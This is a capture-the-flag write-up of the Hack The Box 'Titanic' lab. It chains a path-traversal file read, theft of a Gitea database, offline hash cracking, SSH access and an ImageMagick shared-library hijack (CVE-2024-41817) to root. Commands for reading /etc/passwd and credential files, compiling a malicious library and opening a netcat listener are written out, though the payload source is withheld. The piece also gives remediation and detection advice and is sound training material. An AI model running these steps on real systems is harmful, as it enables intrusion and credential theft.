---
title: "Titanic — Path Traversal to ImageMagick Shared-Library Hijacking"
description: "A download endpoint's path traversal exposes Gitea configuration and database data for password recovery and SSH access; an ImageMagick shared-library hijack (CVE-2024-41817) in a scheduled process provides elevated access."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - path-traversal
  - gitea
  - imagemagick
  - cve-2024-41817
objective: "Turn an unsanitized download parameter into arbitrary file read, recover Gitea credentials for SSH access, and escalate through a scheduled ImageMagick process."
tools:
  - rustscan
  - gobuster
  - curl
  - hashcat
  - ssh
  - sshpass
  - netcat
  - gcc
  - magick
skill: "Linux web exploitation and privilege escalation via path traversal and shared-library hijacking"
outcome: "SSH access as the recovered Gitea user and a root context via an ImageMagick shared-library hijack (CVE-2024-41817)"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; Apache httpd 2.4.52 fronting a Gitea service backed by SQLite |
| Starting position | Unauthenticated network access |
| Objective | Turn an unsanitized download parameter into arbitrary file read, recover Gitea credentials for SSH access, and escalate through a scheduled ImageMagick process |
| Outcome | SSH access as the recovered Gitea user; root via an ImageMagick shared-library hijack (CVE-2024-41817) |

## Download traversal to ImageMagick library hijack

Titanic is an Easy-rated Hack The Box Linux lab. An unsanitized `ticket` parameter in a download endpoint provides arbitrary file read. The primitive exposes Gitea's configuration and its SQLite database, whose password hashes crack to an SSH login. A cron-driven image-identification script then runs a vulnerable ImageMagick build from a writable directory, where ImageMagick loads a planted shared library as root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Path-traversal file read → Gitea configuration and SQLite database exposure → offline hash cracking → SSH access → cron-driven ImageMagick shared-library hijack (CVE-2024-41817) → root**

## Ubuntu Apache host fronting Gitea, download parameter to root

- **Target:** an Ubuntu Linux host exposing SSH (22) and Apache httpd 2.4.52 (80).
- **Web application:** the HTTP service redirects to a lab hostname whose virtual-host namespace hosts a Gitea instance with repositories and a SQLite database backend.
- **Starting position:** unauthenticated network access.
- **Objective:** move from an externally reachable download parameter to authenticated access, then to root by abusing a scheduled image-processing job.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: traversal file read to ImageMagick hijack

### 1. Service and Virtual-Host Discovery

Observation: a fast TCP scan exposes SSH and an Apache web server, and the site redirects to a lab hostname.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

Truncated scan output:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://<TARGET_HOSTNAME>/
```

With the hostname mapped locally, virtual-host enumeration reveals an additional application host:

```bash
gobuster vhost --url http://<TARGET_HOSTNAME> --wordlist <SUBDOMAIN_WORDLIST> --append-domain -r
```

```text
Found: <GITEA_VHOST> Status: 200
```

Significance: the virtual host exposes a separate application surface that the default hostname does not serve directly, so review focuses there.

Result: the source identifies this virtual host as hosting a Gitea instance.

### 2. File-Read Validation

Observation: the main application exposes a download endpoint that passes the `ticket` value to the filesystem without canonicalization.

Action: a representative request supplies a system-file path.

```text
http://<TARGET_HOSTNAME>/download?ticket=/etc/passwd
```

```text
root:x:0:0:root:<REDACTED>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Significance: the endpoint returns arbitrary file content, which establishes a path-traversal file-read primitive and exposes system file content.

Result: the request confirms path traversal.

### 3. Gitea Configuration and Database Access

Observation: the file-read primitive reaches the Gitea data directory.

Action: read the configuration, retrieve the SQLite database, and extract password-verification material.

```bash
curl "http://<TARGET_HOSTNAME>/download?ticket=<GITEA_CONFIG_PATH>"
curl "http://<TARGET_HOSTNAME>/download?ticket=<GITEA_DATABASE_PATH>" --output gitea.db
python3 <GITEA_HASH_EXTRACTOR> gitea.db
```

```ini
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
```

```text
<LAB_ADMIN>:sha256:50000:<HASH_1>
<LAB_USER>:sha256:50000:<HASH_2>
```

Significance: the configuration identifies SQLite as the backend, and the database exposes password-verification material for offline review.

Result: two user password hashes are recovered from the Gitea database.

### 4. Password Recovery and SSH Access

Observation: one recovered hash matches a candidate in a common wordlist.

Action: crack the hashes offline, then authenticate over SSH with the recovered password.

```bash
hashcat <HASH_FILE> <WORDLIST> -D2 --username
sshpass -p '<LAB_USER_PASSWORD>' ssh <LAB_USER>@<TARGET_HOSTNAME>
```

```text
sha256:50000:...:<LAB_USER_PASSWORD>
```

```text
<LAB_USER>@<TARGET_HOSTNAME>:~$
```

Significance: offline password recovery converts application data exposure into authenticated operating-system access.

Result: a shell is obtained over SSH as the recovered Gitea user.

### 5. Scheduled Image Processing Discovery

Observation: local review finds a cron-triggered script that runs ImageMagick from a predictable image directory.

```bash
cat <IMAGE_IDENTIFICATION_SCRIPT>
magick --version
```

```bash
cd <IMAGE_DIRECTORY>
truncate -s 0 metadata.log
find <IMAGE_DIRECTORY>/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

```text
ImageMagick 7.1.1-35
```

Significance: a privileged scheduled process running from a writable, predictable directory makes runtime library resolution security-critical, because ImageMagick searches its working directory for configuration and shared libraries.

Result: the installed build (7.1.1-35) falls within the affected range for CVE-2024-41817.

### 6. ImageMagick Shared-Library Hijacking

Observation: ImageMagick loads `libxcb.so.1` at runtime, and the image-identification script runs with elevated privileges.

Action: a malicious shared library is compiled and placed in the image directory so the scheduled process loads it in place of the system library. I kept the representative listener pattern and summarized the constructor and reverse-shell specifics.

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
<MALICIOUS_LIBRARY_SOURCE>
EOF

nc -nlvp <LISTENER_PORT>
```

```text
<ROOT_USER>@<TARGET_HOSTNAME>:<IMAGE_DIRECTORY>#
```

Significance: CVE-2024-41817 lets an attacker-controlled library in the working directory execute inside the scheduled ImageMagick process, which here runs as root.

Result: the scheduled processing returns an elevated shell in the root context.

## Challenges and Decisions

The source records no failed attempts, tradeoffs, or fixes for this machine.

## Outcome: SSH access and root via shared-library hijack

The source documents authenticated SSH access as the recovered Gitea user and a root context obtained through the scheduled ImageMagick process. Limitation: the malicious library source is summarized, so the payload is not reproduced here and is not reproducible from this writeup.

## Recommendations: the download parameter, exposed hashes, ImageMagick, and committed secrets

The steps below address the demonstrated issues; this exercise did not verify their effectiveness.

1. **Unsanitized download parameter (path traversal).** The `ticket` value reached the filesystem without canonicalization, enabling arbitrary file read that exposed Gitea configuration and its SQLite database. *Recommendation:* resolve requested paths inside an allowlisted base directory, reject traversal sequences, and never pass user input directly to file APIs. *Detection:* alert when `ticket` values contain traversal sequences or absolute paths.
2. **Sensitive material exposed to file read.** Password-verification hashes were recovered from the Gitea database through the same primitive and cracked offline because a user relied on a weak, guessable password that then authenticated over SSH. *Recommendation:* keep database and application files outside web-readable paths, enforce unique high-entropy credentials, and never reuse an application password for operating-system authentication. *Detection:* monitor for credential reuse across services and for logins by application accounts from unexpected sources.
3. **Root-scheduled ImageMagick from a writable directory.** A cron job ran a vulnerable ImageMagick build (CVE-2024-41817) from a directory the low-privileged user could write, so a planted `libxcb.so.1` was loaded and executed as root. *Recommendation:* run scheduled image work from root-owned directories, restrict library resolution to trusted absolute paths, apply the vendor fix (7.1.1-36 or later), and drop privileges for non-essential processing. *Detection:* monitor the image directory for unexpected shared objects or configuration files; alert when libraries load from writable paths.
4. **Credentials disclosed in version control.** A `docker-compose.yml` commit in the Gitea project exposed MySQL credentials that were not used in this attack path, an unnecessary exposure rather than a demonstrated compromise. *Recommendation:* keep secrets out of version control, rotate anything ever committed, and scan repository history with a secret scanner.

## References

- [Hack The Box — Titanic](https://app.hackthebox.com/machines/Titanic) (retired machine)
- [NVD — CVE-2024-41817](https://nvd.nist.gov/vuln/detail/CVE-2024-41817) (ImageMagick arbitrary code execution by loading a malicious shared library from the working directory)
- [GitHub Advisory — GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) (ImageMagick vendor advisory, fixed in 7.1.1-36)
- [RustScan](https://github.com/RustScan/RustScan)
- [Gobuster](https://github.com/OJ/gobuster)
- [Hashcat](https://hashcat.net/hashcat/)
- [sshpass](https://sourceforge.net/projects/sshpass/)
- [ImageMagick command-line tools](https://imagemagick.org/script/command-line-tools.php)
